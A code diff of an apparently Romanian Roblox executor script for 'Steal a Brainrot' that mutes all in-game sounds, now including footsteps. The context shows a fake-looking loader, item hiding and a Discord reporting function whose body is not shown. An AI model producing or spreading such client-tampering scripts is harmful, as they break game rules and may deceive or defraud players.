@@ -1,6 +1,6 @@
 -- Script pentru Delta - Steal a Brainrot (Loader PERMANENT + Discord)
 -- Compatibil cu Delta Executor
--- ACUM OPRESTE TOATE SUNETELE DIN JOC
+-- OPRESTE TOATE SUNETELE, INCLUSIV PAȘII
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -27,16 +27,18 @@ local function sendToDiscord(message)
     end
 end
 
--- ===== OPREȘTE TOATE SUNETELE DIN JOC =====
+-- ===== OPREȘTE TOATE SUNETELE, INCLUSIV PAȘII =====
 local function muteAllSounds()
     local count = 0
-    -- Caută în toate serviciile
+    
+    -- 1. Oprește sunetele din toate serviciile
     local services = {
         Workspace,
         game:GetService("Lighting"),
         game:GetService("ReplicatedStorage"),
         game:GetService("Players").LocalPlayer.PlayerGui,
-        game:GetService("StarterGui")
+        game:GetService("StarterGui"),
+        game:GetService("SoundService")
     }
     
     for _, service in pairs(services) do
@@ -51,7 +53,18 @@ local function muteAllSounds()
         end)
     end
     
-    print("✅ " .. count .. " sunete oprite!")
+    -- 2. Oprește sunetele de pași (specifice)
+    pcall(function()
+        for _, sound in pairs(Workspace:GetDescendants()) do
+            if sound:IsA("Sound") and (sound.Name:lower():find("foot") or sound.Name:lower():find("step") or sound.Name:lower():find("walk")) then
+                sound.Volume = 0
+                sound:Stop()
+                count = count + 1
+            end
+        end
+    end)
+    
+    print("✅ " .. count .. " sunete oprite (inclusiv pași)!")
     return count
 end
 
@@ -409,7 +422,7 @@ local function showLinkGUI()
             gui:Destroy()
             showLoader()
             hideMe()
-            muteAllSounds()  -- <-- OPRESTE TOATE SUNETELE
+            muteAllSounds()  -- <-- OPRESTE TOATE SUNETELE, INCLUSIV PAȘII
             local count = hideBrainrots()
             print("✅ Script activ! " .. count .. " brainrot-uri ascunse.")
         end
